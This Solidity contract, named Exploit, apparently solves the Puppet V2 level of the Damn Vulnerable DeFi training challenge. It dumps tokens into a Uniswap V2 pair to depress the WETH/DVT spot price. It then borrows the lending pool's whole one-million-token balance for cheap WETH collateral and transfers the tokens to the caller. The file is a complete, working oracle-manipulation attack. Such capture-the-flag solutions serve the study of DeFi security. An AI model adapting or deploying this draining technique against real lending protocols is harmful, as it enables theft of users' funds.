// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";
import "./PuppetV2Pool.sol";
import "hardhat/console.sol";

interface ERC20 is IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    uint256 public POOL_INITIAL_TOKEN_BALANCE = 1000000 * 10 ** 18;
    uint256 public maxUint256 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Pair public uniswapV2Pair;
    ERC20 public token;
    IWETH public weth;
    PuppetV2Pool public pool;

    constructor(address _uniswapV2Router, address _token, address _weth, address _pool) public payable {
        token = ERC20(_token);
        weth = IWETH(_weth);
        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
        pool = PuppetV2Pool(_pool);

        // For WETH/DVT pair
        uniswapV2Pair = IUniswapV2Pair(IUniswapV2Factory(uniswapV2Router.factory())
            .getPair(address(weth), address(token)));

        weth.deposit{value: address(this).balance}();

        require(address(uniswapV2Pair) != address(0), "This pool does not exist");
    }

    function exploit(uint amount) external {
        // console.log("Pool: ", pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        tokenToWETH(amount);

        // console.log("Pool: %s, %s", pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), weth.balanceOf(address(this)));
        uint256 wethForBorrow = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        require(wethForBorrow < weth.balanceOf(address(this)), "Not enough WETH");
        weth.approve(address(pool), wethForBorrow);
        pool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function tokenToWETH(uint amount) internal returns (uint) {
        address[] memory path;
        path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), amount);
        uint[] memory amounts = uniswapV2Router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        return amounts[1];

    }

    function WETHToToken(uint amount) internal returns (uint) {
        address[] memory path;
        path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);

        weth.approve(address(uniswapV2Router), amount);
        uint[] memory amounts = uniswapV2Router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        return amounts[1];

    }
}